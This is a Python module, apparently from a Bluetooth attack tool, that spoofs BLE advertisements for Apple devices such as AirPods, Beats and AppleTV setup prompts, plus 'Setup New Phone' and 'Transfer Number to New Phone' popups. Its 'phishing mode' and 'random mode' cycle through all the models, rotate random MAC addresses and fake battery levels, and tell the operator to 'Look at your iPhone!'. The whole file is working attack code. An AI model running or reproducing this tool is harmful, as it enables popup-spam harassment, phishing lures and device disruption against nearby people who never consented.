import time
import random
from apybluez.hci.wrapper import start_spoof, stop_spoof
from apybluez.exceptions import HCISpoofingError
from modules.reset import reset_adapter

class AdvertisingModule:
    DEVICE_DATA = {
        1: {"name": "AirPods"},
        2: {"name": "AirPods Pro"},
        3: {"name": "AirPods Max"},
        4: {"name": "AirPods Gen 2"},
        5: {"name": "AirPods Gen 3"},
        6: {"name": "AirPods Pro Gen 2"},
        7: {"name": "PowerBeats"},
        8: {"name": "PowerBeats Pro"},
        9: {"name": "Beats Solo Pro"},
        10: {"name": "Beats Studio Buds"},
        11: {"name": "Beats Flex"},
        12: {"name": "BeatsX"},
        13: {"name": "Beats Solo3"},
        14: {"name": "Beats Studio3"},
        15: {"name": "Beats Studio Pro"},
        16: {"name": "Beats Fit Pro"},
        17: {"name": "Beats Studio Buds+"},
        18: {"name": "AppleTV Setup"},
        19: {"name": "AppleTV Pair"},
        20: {"name": "AppleTV New User"},
        21: {"name": "AppleTV AppleID Setup"},
        22: {"name": "AppleTV Wireless Audio Sync"},
        23: {"name": "AppleTV Homekit Setup"},
        24: {"name": "AppleTV Keyboard"},
        25: {"name": "AppleTV 'Connecting to Network'"},
        26: {"name": "Homepod Setup"},
        27: {"name": "Setup New Phone"},
        28: {"name": "Transfer Number to New Phone"},
        29: {"name": "TV Color Balance"},
    }

    def __init__(self, dev_id=0, console=None):
        self.dev_id = dev_id
        self.sock = None
        self.console = console

    def log(self, message):
        if self.console:
            self.console.print(message)
        else:
            print(message)

    def start_spoof(self, interval_ms=160, custom_payload=None, model_name="AirPods", phishing_mode=False, 
                    duration=30, jitter=True, dynamic_batt=False, random_mode=False):
        """
        duration: Seconds to spoof a single MAC address before rotating (default 30s)
        jitter: If True, adds random variance to the advertising interval
        dynamic_batt: If True, randomizes battery levels every 1s
        random_mode: If True, randomly cycles through all available models
        """
        reset_adapter(self.dev_id, self.console)
        
        if random_mode:
             self.log(f"[bold red][*] Starting RANDOM MODE ([white]Cycling {len(self.DEVICE_DATA)} models[/white]) on hci{self.dev_id}...[/bold red]")
        elif phishing_mode:
            self.log(f"[bold red][*] Starting PHISHING MODE ([white]Cycling all models[/white]) on hci{self.dev_id}...[/bold red]")
        else:
            self.log(f"[bold blue][*] Starting Spoofing ([white]{model_name}[/white]) on hci{self.dev_id}...[/bold blue]")
        
        if dynamic_batt:
            self.log(f"[magenta][*] Dynamic Battery Mode Enabled. Fluctuating power levels...[/magenta]")

        if random_mode:
             self.log(f"[red][*] RANDOM SAMSARA ACTIVE. Cycling through all known Apple devices...[/red]")
        elif phishing_mode:
            self.log(f"[red][*] PHISHING MODE ACTIVE. Cycling through all models. Look at your iPhone![/red]")
        else:
            self.log(f"[green][*] Broadcasting {model_name}. Look at your iPhone![/green]")
        self.log("[dim][*] Press Ctrl+C to stop.[/dim]")

        try:
             self._spoof_loop(interval_ms, custom_payload, model_name, phishing_mode, duration, jitter, dynamic_batt, random_mode)

        except KeyboardInterrupt:
            self.log("\n[yellow][*] Stopping Advertisement...[/yellow]")
            if self.sock:
                stop_spoof(self.sock)
        except Exception as e:
            self.log(f"[red][!] Error: {e}[/red]")
            if self.sock:
                stop_spoof(self.sock)

    def _spoof_loop(self, interval_ms, custom_payload, model_name, phishing_mode, duration, jitter, dynamic_batt, random_mode):
      
        from apybluez.hci.wrapper import update_data
        
        while True:

            min_int = interval_ms
            max_int = interval_ms
            if jitter:
               
                if interval_ms > 50:
                    min_int = max(20, interval_ms - 10) 
                    max_int = interval_ms + 10

            if random_mode or phishing_mode:
                 
                 
                 
                 keys = list(self.DEVICE_DATA.keys())
                 
                 
                 
                 if random_mode:
                     k = random.choice(keys)
                     m = self.DEVICE_DATA[k]['name']
                 else:
                     k = random.choice(keys) 
                     m = self.DEVICE_DATA[k]['name']

                 try:
                     rand_mac = bytes([random.randint(0, 255) for _ in range(6)])
                     mac_str = ':'.join(f'{b:02x}' for b in rand_mac)
                     
                     self.log(f"[dim]Spoofing {m} on {mac_str} for {duration}s[/dim]") 
                     
                     self.sock = start_spoof(model_name=m, device_id=self.dev_id, 
                                           interval_min=min_int, interval_max=max_int, 
                                           random_mac=rand_mac)
                     
                     
                     if dynamic_batt:
                         elapsed = 0
                         while elapsed < duration:
                             b_left = random.randint(0, 100)
                             b_right = random.randint(0, 100)
                             b_case = random.randint(0, 100)
                             c_left = random.choice([True, False])
                             c_right = random.choice([True, False])
                             c_case = random.choice([True, False])

                             try:
                                 update_data(self.sock, model_name=m,
                                            battery_left=b_left, battery_right=b_right, battery_case=b_case,
                                            charging_left=c_left, charging_right=c_right, charging_case=c_case)
                             except Exception as e:
                                 pass 

                             time.sleep(1)
                             elapsed += 1
                     else:
                         time.sleep(duration)

                     stop_spoof(self.sock)
                     self.sock = None
                     time.sleep(0.1)
                 except HCISpoofingError as e:
                     self.log(f"[red][!] Spoof error: {e}[/red]")
                     time.sleep(1)
            else:
                try:
          
                    rand_mac = bytes([random.randint(0, 255) for _ in range(6)])
                    
                    if dynamic_batt:
                         
                         self.sock = start_spoof(model_name=model_name, device_id=self.dev_id, 
                                               interval_min=min_int, interval_max=max_int,
                                               random_mac=rand_mac)
                         
                         elapsed = 0
                         while elapsed < duration:
                             b_left = random.randint(0, 100)
                             b_right = random.randint(0, 100)
                             b_case = random.randint(0, 100)
                             c_left = random.choice([True, False])
                             c_right = random.choice([True, False])
                             c_case = random.choice([True, False])

                             try:
                                 update_data(self.sock, model_name=model_name,
                                            battery_left=b_left, battery_right=b_right, battery_case=b_case,
                                            charging_left=c_left, charging_right=c_right, charging_case=c_case)
                             except Exception as e:
                                 self.log(f"[red][!] Update Data Error: {e}[/red]")

                             
                             
                             time.sleep(1)
                             elapsed += 1
                        
                         stop_spoof(self.sock)
                         self.sock = None
                         time.sleep(0.1)

                    else:
                        self.sock = start_spoof(model_name=model_name, device_id=self.dev_id, 
                                              interval_min=min_int, interval_max=max_int,
                                              random_mac=rand_mac)
                        
                        elapsed = 0
                        while elapsed < duration:
                            time.sleep(1)
                            elapsed += 1
                        
                        stop_spoof(self.sock)
                        self.sock = None
                        time.sleep(0.1)
                except HCISpoofingError as e:
                     self.log(f"[red][!] Spoof error: {e}[/red]")
                     time.sleep(1)